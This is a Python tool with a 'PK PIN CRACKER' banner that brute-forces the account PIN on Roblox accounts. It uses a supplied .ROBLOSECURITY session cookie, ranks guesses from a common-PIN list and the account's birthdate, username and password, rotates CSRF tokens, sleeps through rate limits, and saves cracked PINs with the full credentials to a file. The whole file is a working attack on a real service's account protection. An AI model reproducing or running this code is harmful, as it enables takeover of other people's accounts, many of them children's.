import os, time, requests
from threading import Thread
from datetime import datetime
from colorama import Fore
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()
print(Fore.MAGENTA + '''
       ╔═════════════════════════════════════════╗q
       ║██████╗░██╗░░██╗░██╗░░░░░░░██╗██╗░██████╗║;
       ║██╔══██╗██║░██╔╝░██║░░██╗░░██║╚█║██╔════╝║;
       ║██████╔╝█████═╝░░╚██╗████╗██╔╝░╚╝╚█████╗░║;
       ║██╔═══╝░██╔═██╗░░░████╔═████║░░░░░╚═══██╗║;
       ║██║░░░░░██║░╚██╗░░╚██╔╝░╚██╔╝░░░░██████╔╝║J------------------------------------;
       ║╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═════╝░╚════════════════════════════════════╗;
       ║░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░║;
       ║██████╗░██╗███╗░░██╗░░░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░║;
       ║██╔══██╗██║████╗░██║░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗║;
       ║██████╔╝██║██╔██╗██║░░██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝║;
       ║██╔═══╝░██║██║╚████║░░██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗║;
       ║██║░░░░░██║██║░╚███║░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║║;
       ║╚═╝░░░░░╚═╝╚═╝░░╚══╝░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝║;
       ╚══════════════════════════════════════════════════════════════════════════════╝J
      ''')

credentials = input(Fore.GREEN + '$ ' + Fore.MAGENTA + 'Enter the account ' 'username' + Fore.GREEN + ':' + Fore.MAGENTA + 'password' + Fore.GREEN + ':' + Fore.MAGENTA + '.ROBLOSECURITY' + Fore.RED + ' or ' + Fore.MAGENTA + '.ROBLOSECURITY ~ ' + Fore.GREEN)
if credentials.count(':') >= 2:
    username, password, cookie = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print(Fore.MAGENTA + 'Logged in to' + Fore.GREEN, username)
except:
    input(Fore.RED + 'INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print(Fore.WHITE + 'Loaded pins by commonality.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(Fore.MAGENTA + 'Prioritized likely pins'+ Fore.GREEN + f'{likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
            print(Fore.MAGENTA + 'Pin cracking: ' + Fore.GREEN + f'{username}' + Fore.MAGENTA + ' ?~? Tried: ' + Fore.GREEN + f'{tried}' + Fore.MAGENTA + ' ?~? Current pin: ' + Fore.GREEN + f'{pin}')
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(Fore.RED + '[FAILURE] ' + Fore.GREEN + 'Account cookie expired.' + Fore.MAGENTA)
                break
            elif code == 1:
                print(Fore.GREEN + '[SUCCESS] ' + Fore.RED + 'NO PIN' + Fore.MAGENTA)
                with open('pins.txt','a') as f:
                    f.write(f'USERNAME: {username}\nNO PIN:\nCREDENTIALS: {credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(Fore.RED + '[ERROR] Too many requests. \n ' + Fore.GREEN + '$' + Fore.RED + ' Sleeping for 5 minutes. [{datetime.now()}]')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'USERNAME: {username}\nPIN: {pin}\nCREDENTIALS: {credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()